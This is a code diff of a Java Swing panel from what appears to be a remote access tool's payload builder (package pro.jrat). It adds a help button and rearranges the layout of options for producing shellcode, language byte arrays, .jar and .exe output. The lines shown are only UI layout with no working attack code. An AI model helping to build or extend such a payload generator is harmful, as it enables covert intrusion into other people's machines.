@@ -11,6 +11,7 @@ import javax.swing.JPanel;
 import javax.swing.JRadioButton;
 import javax.swing.LayoutStyle.ComponentPlacement;
 
+import pro.jrat.Help;
 import pro.jrat.ShellcodeGenerator;
 import pro.jrat.ui.frames.FrameExecutableInfo;
 
@@ -119,36 +120,47 @@ public class PanelBuildOutput extends JPanel {
 		
 		rdbtnexenetExecutable = new JRadioButton(".exe (.NET executable)");
 		buttonGroup.add(rdbtnexenetExecutable);
+		
+		JButton button = new JButton("?");
+		button.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				Help.help("Not recommended. Use third party tool instead.");
+			}
+		});
 		GroupLayout groupLayout = new GroupLayout(this);
 		groupLayout.setHorizontalGroup(
 			groupLayout.createParallelGroup(Alignment.LEADING)
 				.addGroup(groupLayout.createSequentialGroup()
-					.addGap(37)
-					.addComponent(rdbtnShellcode))
-				.addGroup(groupLayout.createSequentialGroup()
-					.addGap(58)
-					.addComponent(rdbtnCcArray))
-				.addGroup(groupLayout.createSequentialGroup()
-					.addGap(58)
-					.addComponent(rdbtnPythonArray))
-				.addGroup(groupLayout.createSequentialGroup()
-					.addGap(58)
-					.addComponent(rdbtnJavaArray))
-				.addGroup(groupLayout.createSequentialGroup()
-					.addGap(58)
-					.addComponent(rdbtnDelphiArray))
-				.addGroup(groupLayout.createSequentialGroup()
-					.addGap(58)
-					.addComponent(rdbtnCArray))
-				.addGroup(groupLayout.createSequentialGroup()
-					.addGap(37)
 					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
-						.addComponent(rdbtnjarjavaArchive)
 						.addGroup(groupLayout.createSequentialGroup()
-							.addComponent(rdbtnexenetExecutable)
-							.addGap(4)
-							.addComponent(btnAssemblyInfo)))
-					.addGap(171))
+							.addGap(37)
+							.addComponent(rdbtnShellcode))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(58)
+							.addComponent(rdbtnCcArray))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(58)
+							.addComponent(rdbtnPythonArray))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(58)
+							.addComponent(rdbtnJavaArray))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(58)
+							.addComponent(rdbtnDelphiArray))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(58)
+							.addComponent(rdbtnCArray))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(37)
+							.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
+								.addComponent(rdbtnjarjavaArchive)
+								.addGroup(groupLayout.createSequentialGroup()
+									.addComponent(rdbtnexenetExecutable)
+									.addGap(4)
+									.addComponent(btnAssemblyInfo)
+									.addPreferredGap(ComponentPlacement.RELATED)
+									.addComponent(button)))))
+					.addGap(76))
 		);
 		groupLayout.setVerticalGroup(
 			groupLayout.createParallelGroup(Alignment.LEADING)
@@ -158,7 +170,9 @@ public class PanelBuildOutput extends JPanel {
 					.addPreferredGap(ComponentPlacement.RELATED)
 					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
 						.addComponent(rdbtnexenetExecutable)
-						.addComponent(btnAssemblyInfo))
+						.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
+							.addComponent(btnAssemblyInfo)
+							.addComponent(button)))
 					.addGap(3)
 					.addComponent(rdbtnShellcode)
 					.addGap(3)
